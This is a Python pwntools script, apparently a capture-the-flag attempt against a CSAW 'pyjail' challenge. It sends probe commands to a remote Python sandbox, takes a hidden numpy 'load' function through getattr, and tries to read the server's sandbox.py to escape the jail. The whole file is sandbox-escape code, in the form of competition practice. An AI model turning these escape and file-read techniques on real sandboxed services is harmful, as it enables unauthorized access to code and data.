#!/usr/bin/env python3
from pwn import *
import base64

def try_command(conn, cmd):
    conn.recvuntil(b'>>> ')
    conn.sendline(cmd.encode())
    return conn.recvuntil(b'>>> ', drop=True).decode()

conn = remote('pwn.chal.csaw.io', 8000)

# Try some basic numpy operations first
commands = [
    "print(type(RMbPOQHCzt))",
    "print(dir(RMbPOQHCzt))",
    "load = getattr(RMbPOQHCzt, 'load')",
    "print(type(load))",
]

for cmd in commands:
    try:
        result = try_command(conn, cmd)
        print(f"Command: {cmd}")
        print(f"Result: {result}\n")
    except Exception as e:
        print(f"Error on command {cmd}: {str(e)}\n")

# Try to read sandbox.py using numpy's load
try:
    cmd = "print(load(open('sandbox.py', 'rb')).tobytes().decode())"
    result = try_command(conn, cmd)
    print(f"Sandbox.py contents:\n{result}")
except Exception as e:
    print(f"Error reading sandbox.py: {str(e)}")

conn.close()
